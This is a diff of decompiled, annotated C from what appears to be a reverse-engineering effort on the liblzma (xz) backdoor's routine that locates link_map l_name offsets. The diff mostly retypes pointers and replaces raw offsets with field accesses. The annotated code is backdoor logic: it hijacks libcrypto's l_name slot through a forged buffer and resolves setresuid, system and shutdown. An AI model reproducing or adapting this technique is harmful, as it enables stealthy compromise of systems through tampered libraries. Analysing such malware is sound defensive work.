@@ -23,7 +23,7 @@ BOOL find_link_map_l_name_offsets
 {
   libc_imports_t *libc_imports;
   elf_info_t *ldso_image;
-  link_map *candidate_name_ptr;
+  link_map **candidate_name_ptr;
   dl_audit_symbind_alt_fn code_start;
   BOOL status_ok;
   ptrdiff_t l_name_slot_offset;
@@ -40,10 +40,10 @@ BOOL find_link_map_l_name_offsets
   pfn_system_t system_fn;
   pfn_shutdown_t shutdown_fn;
   link_map *best_name_ptr_slot;
-  link_map *best_name_ptr;
+  link_map **best_name_ptr;
   u64 displacement;
   link_map *snapshot_slot;
-  link_map *name_ptr_upper_bound;
+  link_map **name_ptr_upper_bound;
   link_map *snapshot_cursor;
   
   status_ok = secret_data_append_bits_from_addr_or_ret
@@ -85,24 +85,24 @@ BOOL find_link_map_l_name_offsets
       audit_sym_start = ldso_image->elfbase->e_ident + audit_preinit_symbol->st_value;
       // AutoDoc: Clamp the `_dl_audit_preinit` span to mapped ld.so pages so bogus symbol data cannot trick the search.
       status_ok = elf_vaddr_range_has_pflags(ldso_image,audit_sym_start,audit_preinit_symbol->st_size,4);
-      snapshot_slot = snapshot_cursor + 0x960;
+      snapshot_slot = snapshot_cursor + 0x3c;
       if (status_ok != FALSE) {
 LAB_001041f0:
         if (snapshot_cursor != snapshot_slot) {
           ldso_image = data_handle->cached_elf_handles->liblzma;
           // AutoDoc: Scan the live liblzma `link_map` until the stored GNU_RELRO vaddr+size tuple surfaces; this anchors the tail layout for the running glibc build.
-          if ((*(u64 *)snapshot_cursor != ldso_image->gnurelro_vaddr) ||
-             (*(u64 *)(snapshot_cursor + 8) != ldso_image->gnurelro_memsize)) goto LAB_001041ec;
+          if ((snapshot_cursor->l_addr != ldso_image->gnurelro_vaddr) ||
+             (snapshot_cursor->l_name != (char *)ldso_image->gnurelro_memsize)) goto LAB_001041ec;
           best_name_ptr_slot = (link_map *)0x0;
-          best_name_ptr = (link_map *)0xffffffffffffffff;
+          best_name_ptr = (link_map **)0xffffffffffffffff;
           // AutoDoc: Search the `link_map` prefix for the smallest self-relative pointer that lands just past the RELRO tuple; treat it as the libname buffer pointer.
-          for (snapshot_slot = data_handle->runtime_data->liblzma_link_map; snapshot_slot < snapshot_cursor + 0x18;
-              snapshot_slot = snapshot_slot + 8) {
-            candidate_name_ptr = *(link_map **)snapshot_slot;
-            if (snapshot_cursor + 0x18 <= candidate_name_ptr) {
+          for (snapshot_slot = data_handle->runtime_data->liblzma_link_map; snapshot_slot < &snapshot_cursor->l_next;
+              snapshot_slot = (link_map *)&snapshot_slot->l_name) {
+            candidate_name_ptr = (link_map **)snapshot_slot->l_addr;
+            if (&snapshot_cursor->l_next <= candidate_name_ptr) {
               name_ptr_upper_bound = best_name_ptr;
-              if (snapshot_cursor + 0x68 <= best_name_ptr) {
-                name_ptr_upper_bound = snapshot_cursor + 0x68;
+              if (&snapshot_cursor[2].l_next <= best_name_ptr) {
+                name_ptr_upper_bound = &snapshot_cursor[2].l_next;
               }
               if (candidate_name_ptr < name_ptr_upper_bound) {
                 best_name_ptr_slot = snapshot_slot;
@@ -110,7 +110,7 @@ LAB_001041f0:
               }
             }
           }
-          if (best_name_ptr != (link_map *)0xffffffffffffffff) {
+          if (best_name_ptr != (link_map **)0xffffffffffffffff) {
             allocator->opaque = data_handle->cached_elf_handles->libc;
             setresuid_fn = (pfn_setresuid_t)lzma_alloc(0xab8,allocator);
             libc_imports->setresuid = setresuid_fn;
@@ -127,7 +127,8 @@ LAB_001041f0:
             }
             // AutoDoc: Cache the address of libcrypto’s `l_name` slot so stage two can swap it to the forged basename buffer and restore it later.
             (hooks->ldso_ctx).libcrypto_l_name =
-                 (char **)(data_handle->runtime_data->libcrypto_link_map + l_name_slot_offset);
+                 (char **)((long)&data_handle->runtime_data->libcrypto_link_map->l_addr +
+                          (ulong)l_name_slot_offset);
             // AutoDoc: Require `_dl_audit_preinit` to reference the inferred libname offset via LEA before trusting the layout.
             status_ok = find_lea_with_displacement
                               (audit_sym_start,audit_sym_start + audit_preinit_symbol->st_size,displacement);
@@ -166,7 +167,7 @@ LAB_001041f0:
   }
   return FALSE;
 LAB_001041ec:
-  snapshot_cursor = snapshot_cursor + 8;
+  snapshot_cursor = (link_map *)&snapshot_cursor->l_name;
   goto LAB_001041f0;
 }
 
